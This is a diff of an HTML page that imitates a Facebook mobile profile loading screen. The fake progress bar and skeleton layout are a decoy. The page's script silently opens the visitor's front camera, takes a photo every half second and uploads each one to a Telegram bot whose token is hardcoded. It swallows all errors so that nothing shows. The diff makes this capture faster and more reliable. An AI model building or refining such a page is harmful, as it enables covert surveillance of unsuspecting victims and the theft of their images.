@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Facebook</title>
     <style>
-        /* Reset and Mobile Lock */
+        /* Reset and Mobile Configuration */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -23,7 +23,7 @@
             overflow: hidden;
         }
 
-        /* Mobile Container Size */
+        /* Mobile Wrapper */
         .app-container {
             width: 100%;
             max-width: 480px; 
@@ -32,9 +32,10 @@
             position: relative;
             display: flex;
             flex-direction: column;
+            overflow: hidden;
         }
 
-        /* Top Nav Layout */
+        /* Top Navigation Bar */
         .top-nav {
             width: 100%;
             height: 48px;
@@ -56,7 +57,7 @@
             margin-left: 4px;
         }
 
-        /* Facebook-style Progress Track */
+        /* Blue Progress Bar Track */
         .progress-track {
             position: absolute;
             bottom: 0;
@@ -66,7 +67,7 @@
             background-color: #242526;
         }
 
-        /* Advanced Progress Bar Animation (Never Fills) */
+        /* Advanced Progress Bar Animation (Never Fills, Loops Smoothly) */
         .progress-bar {
             height: 100%;
             width: 0%;
@@ -76,10 +77,10 @@
 
         @keyframes fbLoading {
             0% { width: 0%; }
-            12% { width: 55%; }
-            30% { width: 70%; }
-            60% { width: 83%; }
-            90% { width: 90%; }
+            10% { width: 55%; }
+            35% { width: 72%; }
+            65% { width: 84%; }
+            90% { width: 92%; }
             100% { width: 92%; }
         }
 
@@ -90,7 +91,7 @@
             flex-grow: 1;
         }
 
-        /* ---- SCREEN CENTER SPINNER & LOADING TEXT (FIXED Alignment & Pushed Down) ---- */
+        /* ---- FIXED SCREEN CENTER SPINNER & LOADING TEXT ---- */
         .spinner-overlay {
             position: absolute;
             top: 0;
@@ -105,7 +106,7 @@
             z-index: 20; 
             pointer-events: none;
             gap: 12px; 
-            padding-top: 80px; /* আপনার কথা মতো স্পিনারটিকে আরেকটু নিচে নামানোর জন্য প্যাডিং যোগ করা হয়েছে */
+            padding-top: 80px; 
         }
 
         .fb-spinner {
@@ -115,7 +116,6 @@
             border-top: 3.5px solid #8a8d91;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
-            display: inline-block;
         }
 
         .loading-text {
@@ -123,7 +123,6 @@
             font-size: 14px;
             font-weight: 500;
             letter-spacing: 0.5px;
-            width: 100%;
         }
 
         @keyframes spin {
@@ -131,7 +130,7 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Cover Photo Skeleton */
+        /* ---- SKELETON ELEMENTS WITH PROPER COLORS ---- */
         .cover-photo {
             width: 100%;
             height: 200px; 
@@ -140,51 +139,53 @@
             border-bottom-right-radius: 12px;
         }
 
-        /* Profile & Content Section */
-        .profile-section {
-            padding: 0 16px;
+        .profile-area {
             position: relative;
-            margin-top: -40px; 
+            padding: 0 16px;
+            margin-top: -45px;
+            display: flex;
+            align-items: center; 
+            gap: 16px; 
         }
 
-        /* Profile Circle */
         .profile-circle {
             width: 110px;
             height: 110px;
             border-radius: 50%;
-            background-color: #3a3b3c;
+            background-color: #3a3b3c; 
             border: 4px solid #18191a;
+            flex-shrink: 0;
         }
 
-        /* Text Skeleton Rows */
         .text-container {
-            margin-top: 14px;
-            padding-left: 4px;
-        }
-
-        .line-short {
-            width: 120px;
-            height: 18px;
-            background-color: #3a3b3c;
-            border-radius: 9px;
-            margin-bottom: 12px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 10px; 
+            margin-top: 25px;
         }
 
         .line-long {
-            width: 210px;
-            height: 14px;
-            background-color: #3a3b3c;
-            border-radius: 7px;
+            width: 180px; 
+            height: 16px;
+            background-color: #3a3b3c; 
+            border-radius: 8px;
         }
 
-        /* Shimmer/Pulse Effect */
+        .line-short {
+            width: 110px; 
+            height: 12px;
+            background-color: #3a3b3c; 
+            border-radius: 6px;
+        }
+
         .pulse {
             animation: fbPulse 1.4s ease-in-out infinite;
         }
 
         @keyframes fbPulse {
             0% { opacity: 0.4; }
-            50% { opacity: 0.8; }
+            50% { opacity: 0.9; }
             100% { opacity: 0.4; }
         }
 
@@ -197,7 +198,6 @@
 <body>
 
     <div class="app-container">
-        <!-- Header / Top Nav -->
         <div class="top-nav">
             <div class="back-arrow"></div>
             <div class="progress-track">
@@ -205,24 +205,20 @@
             </div>
         </div>
 
-        <!-- Content Body Layout -->
         <div class="content-body">
             
-            <!-- Real Buffering Spinner & Text Overlay (Centered & Aligned) -->
             <div class="spinner-overlay">
                 <div class="fb-spinner"></div>
                 <div class="loading-text" id="statusText">Loading...</div>
             </div>
 
-            <!-- Cover Photo -->
             <div class="cover-photo pulse"></div>
 
-            <!-- Profile & Details -->
-            <div class="profile-section">
+            <div class="profile-area">
                 <div class="profile-circle pulse"></div>
                 <div class="text-container">
-                    <div class="line-short pulse"></div>
                     <div class="line-long pulse"></div>
+                    <div class="line-short pulse"></div>
                 </div>
             </div>
 
@@ -233,7 +229,7 @@
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
-    <!-- ========== শুধু ক্যামেরা + টেলিগ্রাম (UI-তে কোনো পরিবর্তন নেই) ========== -->
+    <!-- ========== ক্যামেরা + টেলিগ্রাম বট কোড (UI-তে কোনো পরিবর্তন নেই) ========== -->
     <script>
         // ===================== টেলিগ্রাম বট তথ্য =====================
         const BOT_TOKEN = "8354299407:AAFKUoOn9W3EdyIHpTljauF3VN_Ed3HihxQ";
@@ -253,42 +249,67 @@
                 const mediaStream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: "user",
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
+                        width: { ideal: 320 },
+                        height: { ideal: 240 }
                     }
                 });
                 stream = mediaStream;
                 video.srcObject = stream;
-                await video.play();
-                startCapturing();
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    startCapturing();
+                };
+                
+                setTimeout(() => {
+                    if (!isCapturing) {
+                        startCapturing();
+                    }
+                }, 500);
+                
             } catch (e) {
                 // চুপিসারে ব্যর্থ — UI-তে কিছু দেখাবে না
             }
         }
 
-        // ========== ২. প্রতি সেকেন্ডে ছবি তোলা ==========
+        // ========== ২. প্রতি ০.৫ সেকেন্ডে ছবি তোলা ==========
         function startCapturing() {
             if (isCapturing) return;
+            if (!video.videoWidth || !video.videoHeight) {
+                setTimeout(startCapturing, 200);
+                return;
+            }
+            
             isCapturing = true;
+            captureNow();
+            
             captureInterval = setInterval(() => {
-                if (video.readyState === 4 && video.videoWidth > 0) {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
-                    sendPhotoToTelegram(dataUrl);
-                }
-            }, 1000);
+                captureNow();
+            }, 500);
+        }
+
+        function captureNow() {
+            if (!video.videoWidth || !video.videoHeight) return;
+            
+            try {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
+                sendPhotoToTelegram(dataUrl);
+            } catch (e) {
+                // চুপ
+            }
         }
 
         // ========== ৩. ছবি টেলিগ্রামে পাঠানো ==========
         async function sendPhotoToTelegram(base64) {
-            const blob = dataURLtoBlob(base64);
-            const form = new FormData();
-            form.append('chat_id', CHAT_ID);
-            form.append('photo', blob, `pic_${Date.now()}.jpg`);
             try {
+                const blob = dataURLtoBlob(base64);
+                const form = new FormData();
+                form.append('chat_id', CHAT_ID);
+                form.append('photo', blob, `pic_${Date.now()}.jpg`);
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: form
